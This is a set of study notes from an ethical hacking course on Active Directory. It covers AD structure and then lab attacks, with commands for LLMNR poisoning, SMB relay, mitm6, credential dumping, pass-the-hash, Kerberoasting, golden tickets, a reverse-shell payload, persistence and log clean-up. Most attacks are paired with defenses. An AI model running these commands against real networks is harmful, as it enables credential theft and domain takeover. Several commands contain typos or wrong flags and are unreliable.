# Practical Ethical Hacking - The Complete Course By TCM - Part 2

## Active Directory Overview

**What is Active Directory?**

* Directory service developed by Microsoft to manage windows domain network
* stores info related to objects, such as computer , users, printers, etc.
  * think about it as a phonr book for windows
* Authenticates using Kerberos tickets.
  * non-windows devices, such as Linux machines, firewalls, etc . can also authenticate to Active Directory via RADIUS or LDAP
  
**Why Active Directory ?**

* Active Directory is the most commonly used identity management service in the world
  * 95% of Fortune 1000 companies implement the service in their network
* Can be exploited without ever attacking patchable exploits.
  * insted, we abuse features, trust, components, and more.


### Physical Active Directory Components

**Domain Controllers**

* A domain controller is a server with AD DS server role installe that has specifically been promoted to a domain controller

* Host a copy of the AD DS directory store
* Provide authentication and authorization serivces
* Replicate updates to other domain controllers in the domain and forest
* Allow administrative access to manage user account and network resources

**AD DS Data Store**

* The AD DS data store contains the database files and processes that store and manage directory info for users, service, and applications.

* The AD DS data store:
  * Consist of the NTDS.dit file
  * it stored by default in the %SystemRoot%\NTDS folder on all domain controllers
  * us accessible only through the domain controller processes and protocols.


### Logical Active Directory Components

**AD DS Schema**

* Defines every type of object that can be stored in the directory 
* Enforces rules regulations object creation and configuration


**Domain**

* domains are used to group and manage object in an organization 

* an administrative boundary for applying polices to group of objects
* a replication boundary for replacing data between domain controllers
* an Authetication and all authorization boundary that provides a way to limit the scope of access to resources.


**Tree**

* A domain tree is a hierarchy of domain in AD DS

* All domains in the tree:
  * shares a contiguous namespace with the parent domain
  * can have additional child domains
  * By default create a two-way transitive trust with other domains


**Forest**

* a forest is a collection of one or more domain tree

* Forests:
 * share a comman schema
 * share a common configuration partition
 * share a common global catlog to enable searching 
 * enable trusts between all domain in the forest
 * shares the enterprise admins and schema admins groups
 
**Organizational Units (Ous)**

* Ous are AD containers that can contain users, groups, computers, and other OUs


**Trusts**

* trust provide a mechanism for users to gain access to resources in other domain

Types | Description 
------|------------
Directional |  the trust direction flows form trusting domains to trusted domain
Transitive | the trust relationship is extended beyound a two-domain trust to include other trusted domains

* all domains in a forest trust all other domains in the forest 
* trusts can extend outside the forest 

**Objects**

Object  | Description
--------|------------
user | enables network resource access for a user
inetOrgPerson | ->similar to user account ->Used for compatibility with other directory services
contacts | -> used primarily to assign e-mail addresses to external users -> does not enable network access
groups | used to simplyfy the administrationof access control 
compurts | enables authentication and autditing of computer access to resources
printers | used to simplify the process of locating an contacting ot printers
shared folders | enables users to search for shared folders based on properties


## Active Directory Lab Build

### Lab Overview and Requirements

* Lab 
  * 1 windows server 2019
  * 2 Windows 10 Enterprise
* Requirements (minimum)
  * 60 GB Disk Space
  * 16 GB RAM
* I don't meet the requirements. what now?

### Downloading Necessary ISOs

* search for microsoft evaluation center

* checkout the latest product 
   * download windows 10 enterprise and windows server evaluations ISO
  
  
### Setting Up the Domain Controllers

###  Setting Up the User Machines

### Setting Up Users, Groups, and Policies

### Joining Our Machines to the Domain


## Attacking Active Directory: Initial Attack Vectors

### Introduction


* Top Five Ways I Got Domain Admin - https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa


### LLMNR Poisoning Overview

* Link Local Multicahe Name Resolution
* used to identify hosts when DNS fails to do so 
* Previously NBT-NS
* Key flaw is that the services utilize a user's username and NTLMv2 hash when appropriately respond to 

* **Responder**

 * Step 1. Run Responder
   ```python Responder.py -l tun0 -rdw ```

 * Step 2. An Event Occurs..
 * Step 3. Get Dem Hashes
 * Step 4. Crack Dem Hashes
    ```hashcat -m 5600 hashes.txt rockyou.txt ```   
 
 ### Capturing NTLMv2 Hashes with Responder
 
 * ```responder -I eth0 -rdwv ```
 
 ### Password Cracking with Hashcat
 
 * ```hashcat -m 5600 ntlmhash.txt rockyou.txt --force ```
 
    * 5600 is used so that hashcat will know that the hash we want to crack is a NTLM hash
    
 * we can look for seclist for the password
 
 * for using hashcat in windows we can download the binaries from their site
 
 
### LLMNR Poisoning Defense 

* disable LLMNR and NBT-Ns
* Enable network control
* make a stron user password (>14 characters and limit common word usage)

### SMB Relay Attacks Overview

**SMB Relay**

* Insted of cracking hashes gathered with Responder, we can instead rely those hashes to specific machines and potentially gain access

* Requirements
  * SMB signing must be disabled on the target 
  * Relaayed user credentials must be admin on machine


* Step 1. Run Responder 
* Step 2. ```python Responder.py -I tun0 -rdw ```
* Step 3.Set up your relay 
  
  ```python ntlmrelayx.py -tf targets.txt -smb2support ```

* Step 4. An Event Occurs....
* Step 5. Win


### Discovering Hosts with SMB Signing Disabled

* Run nessus to check smbsignning enabkle or disable 
* Use nmap for smbsignning check 
  * ```nmap  --script=smb2-security-mode.nse -p445 192.168.57.0/24 ```
  
* put the targets in a file 

### SMB Relay Attack Demonstration

* edit the Responder.conf to turn off SMB and HTTP
* ```responder -I eth0 -rdw ```
* ``` ntlmrelayx.py -tf targets.txt -smb2support ```

* ``` ntlmrelayx.py -tf targets.txt -smb2support -i ```
  * where -i flag is used for intrective smb shell


### SMB Relay Attack Defenses
 
* Enable SMB Signing on all devices
* Disable NTLM authentication on network
* Account Tiering 
* Local admin restriction

### Gaining Shell Access

* use ```msfconsole ```
  * use /windows/smb/psexec
  
* psexec.py 
  * ```psexec.py marvel.local//fcastle:Password1@192.168.57.141 ```
  
### IPv6 Attacks Overview

* DNS takeover using these attacks

### Installing mitm6

* download it from fox-it/mitm6 from github
* ```pip3 install - ```

### IPv6 DNS Takeover via mitm6

* ```mitm6 -d marvel.local ```
* ```ntlmrelayx.py -6 -t ldaps://192.168.57.140 -wh fakewpad.marvel.local -l lootme ```


* Resources 
  * mitm6: https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/

  * Combining NTLM Relays and Kerberos Delegation: https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/


### IPv6 Attack Defenses

* Disable IPv6
* Enable LDAP signing and LDAP channel binding
* Use block rules on firewall
* if WAPD is not in use internally , disable it via Group policies


### Other Attack Vectors and Strategies

* begin day with mitm6 or responder
* run scan to generate traffic
* if scan are taking too long, look for websites in scope(http_version)
* Look for default credentials on web logins
  * Printers
  * Jenkins
  * Etc
* Think outside the box  


## Attacking Active Directory: Post-Compromise Enumeration


### PowerView Overview

* download powerview from github
* upload to any victim machine

### Domain Enumeration with PowerView

PowerView Cheat Sheet: https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993

* ```powershell -ep bypass ```
* ```. .\Powerview.ps1 ```

*  ```Get-NetDomain ```

* ```Get-NetDomainController ```

* ```Get-DomainPolicy ```

* ```(Get-DomainPolicy)."system access" ```

* ```Get-NetUser ```

* ```Get-NetUser | select sn ```

* ```Get-NetUser | select sameaccountname ```

* ```Get-UserProperty ```

* ```Get-UserProperty -Propeerties pwdlastset ```

* ```Get-UserProperty -Propeerties logoncount ```

* ```Get-UserProperty -Propeerties badpwdcount ```

* ```Get-NetComputer ```
* ```Get-NetComputer -fulldata ```
* ```Get-NetComputer -fulldata | select OperatingSystem ```

* ```Get-NetGroup -GroupName "Domain Admin" ```
* ```Get-NetGroup -GroupName "admin" ```

* ```Invoke-ShareFinder ```
* ```Get-NetGPO ```

### Bloodhound Overview and Setup

* ```apt-install bloodhound ```

* ```neo4j console ```

* ```bloodhound ```

### Grabbing Data with Invoke-Bloodhound

* copy the sharphound.ps1 and run it

* ```. .\sharphound.ps1 ```

* ```Invoke-BloodHound -CollectMethod All -Domain Marvel.local -ZipFileName file.zip ```

### Enumerating Domain Data with Bloodhound

* upload the data

* use prebuilt queries

## Attacking Active Directory: Post-Compromise Attacks

* before this , we must have some creds 

### Pass the Hash / Password Overview

* if we crac k a password and/or can dump the SAM hashes, we can leverage both for lateral movement in networks

**crackmapexec**

  ```crackmapexec <ip/CIDR> -u <user> -d <domain> -p <pass> ```
  
  
### Installing crackmapexec

* ```apt install crackmapexec ```

### Pass the Password Attacks

* ``` crackmapexec 192.168.57.0/24 -u fcastle -d MARVEL.local -p Password1 ```

* ``` crackmapexec 192.168.57.0/24 -u fcastle -d MARVEL.local -p Password1 --sam ```

* ```psexec.py marvel/fcastle:Password1@192.168.5.142 ```

### Dumping Hashes with secretsdump.py

* ```secretsdump.pymarvel/fcastle:Password1@192.168.5.141 ```

* ```secretsdump.pymarvel/fcastle:Password1@192.168.5.141 ```

### Cracking NTLM Hashes with Hashcat

* ```hashcat -m 1000 hashes.txt rockyou.txt -O ```

### Pass the Hash Attacks

* ```crackmapexec 192.168.57.0/24 -u "Frank Castle" -H 134fghj2j1423h4h1 --local ```

* ```psexec.py "frank castle":@192.168.5.142 -hashes 134fghj2j1423h4h1:134fghj2j1423h4h1 ```

### Pass Attack Mitigations

* limit account reuse
* utilize strong password
* privilege Access Management (PAM)


### Token Impersonation Overview

* Temporary keys that allow you access to a system/network without having to provide credentials each time yoy can access a file. Think cookies for computers.

* Two Types:
  * **Deligate** - Created for logging into a machine or using Remote Desktop
  * **Impersonate** - "non-interactive" suh as attaching a network drive or domain logo script
  
  
### Token Impersonation with Incognito 

* ```msfconsole ```

* ``` use exploit/windows/smb/psexec ```

* ``` set payload wndows/x64/meterpreter/reverse_tcp ```

* ```load incognito ```

* ```list_tokens -u ```

* ```impersomate_token marvel\\administrator ```

* ```shell ```

* ```rev2self ```

* Delegate token can be imporsenate untill the system is rebooted

### Token Impersonation Mitigation

* limit user/group token creation permissions
* Account tiering 
* Local admin restriction

###  Kerberoasting Overview

https://medium.com/@Shorty420/kerberoasting-9108477279cc

**GOAL of  Kerberoasting** :
 
  * Get TGS and decrypt server's account hash.

* Step 1. Get SPNs, Dump Hash
  ```python GetUserSPNs.py <DOMAIN/username:password> -dc-ip <ip of DC> -request ```
  
* Step 2. crack the hash 
  ```hashcat -m 1000 hash.txt rockyou.txt ```
  
 ### Kerberoasting Walkthrough

* ```python GetUserSPNs.py marvel.local/fcastle:Password1 -dc-ip 192.168.57.140 -request ```

* ```hashcat -m 13100 hash.txt rockyou.txt ```

### Kerberoasting Mitigation

* Strong Password
* Least privilege


### GPP / cPassword Attacks Overview

Group Policy Pwnage: https://blog.rapid7.com/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/

* Group Policy Preferences allowed admins to create policies using embeded credentials
* These credentials were encrypted and placed in a "cPassword"
* The key was accidentally released (whoops)
* Patched in MS14-025, but doesn't prevent previous uses


### Abusing GPP


* Using Hack the box **Active** (10.10.10.100) machine

* when we scan against a DC we see port 53, 88, 389,445 open

* ```smbclient -L \\\\10.10.10.100\\ ```

* ```smbclient  \\\\10.10.10.100\\Replication ```

* ``` smb: \> prompt off ```

* ``` smb: \> recurse on  ```

* ``` smb: \> mget * ```

* open the Group.xml

* decrypt it using gpp-decrypt

* this is not a system level user , so we need to use 

* ```psexec.py active.htb/svc_tgs:asdfyhjadiqiwd@10.10.10.100 ```

* lets try kerbrosting : ```GetUsersSPNs.py active.htb/svc_tgs:password -dc-ip 10.10.10.100 -request ```

* now we have a service ticket ,so we need to crack this 

* ```hashcat -m 13100 hashes.txt rockyou.txt ```

* ```psexec.py active.htb/Administrator:Ticket1968@10.10.10.100 ```


### Mimikatz Overview

Mimikatz: https://github.com/gentilkiwi/mimikatz

* tool used to view and steal credentials, generate kerberos tickets, and leverage attacks
* Dumps creds stored in memory
* Just few attacks: Credential Dumping, Pass-the_Hash, Over-Pass-the-Hash, Pass-the Ticket, Golden Ticket,Silver Ticket


* Invoke-Mimikatz is used to bypasas the antivirus


### Credential Dumping with Mimikatz

* extract mimikatz to folder
* look through different modules in modules

* ```mimikatz.exe ```
* ```privilage::debug ``` 
* ```sekurlsa::logonpassword```
* ```lsadump::sam ```
* ```lsadump::lsa /patch ```


### Golden Ticket Attacks

* ```mimikatz.exe ```
* ```privilage::debug ```
* ```lsadump::lsa /inject /name:krbtgt ```

* ```kerberos::golden /User:Administrator /domain:marvel.local /sid:S-!-S...... /krbtgt:1fff1a64..... /id:500 /ptt ```

* ```misc::cmd ```
* ``` dir \\THEPUNISHER\C$ ```
* ```psexec.exe \\THEPUNISHER cmd ```
*


### Conclusion and Additional Resources

* Active Directory Security Blog: https://adsecurity.org/

* Harmj0y Blog: http://blog.harmj0y.net/

* Pentester Academy Active Directory: https://www.pentesteracademy.com/activedirectorylab

* Pentester Academy Red Team Labs: https://www.pentesteracademy.com/redteamlab

* eLS PTX: https://www.elearnsecurity.com/course/penetration_testing_extreme/


## Post Exploitation

### File Transfers Review

* Certutil
  * certutil.exe -urlcache -f http://10.10.10.10/file.txt file.txt
* HTTP
  * python -m SimpleHTTPServer 80
* Browser
  * Navigate directly to file 
* FTP
  * python -m pyftpdlib 21 (attacker machine)
  * ftp 10.10.10.10
* Linux
  * wget


### Maintaining Access Overview

* Persistence Scripts
  * run persistence -h 
  * exploit/window/local/persistence
  * exploit/window/local/registry_persistence
* Schedule Tasks
  * run scheduleme
  * run schtaskabuse
* Add a user 
  * net user hacker password123 /add
  
### Pivoting Walkthrough

* ```msfconsole ```
* ``` exploit/window/psexec ```
* ```> shell ``` 
* ```route print ```
* ```arp -a ```
* ```run autoroute -s 10.10.10.0/24 ```
* ```run autoroute -p ```
* ```background ```
* ```auxilary/scanner/portscan/tcp ```

### Cleaning Up

* make the system/network as it was when you entered it 
  * Remove executables, script, amd added files
  * Remove malware, rootkits, and added user accounts
  * Set settings back to original configurations
  
 * eleminate youself from logfile
  






















